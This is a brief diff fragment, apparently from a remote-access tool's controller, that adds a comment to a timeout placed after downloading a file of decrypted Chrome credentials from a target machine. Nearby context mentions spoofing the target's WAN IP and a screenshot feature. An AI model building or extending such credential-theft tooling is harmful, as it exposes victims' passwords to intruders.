@@ -252,7 +252,7 @@ spoof_wanip                   :    Spoofs public/wan ip of the trgt machine
 
 			download_file("chrome_creds.txt")
 
-			trgt.settimeout(5)
+			trgt.settimeout(5)                  # waiting for 5 seconds so that password decrypting and downloading in done with out any error
 
 		# Screenshot    ✓
 
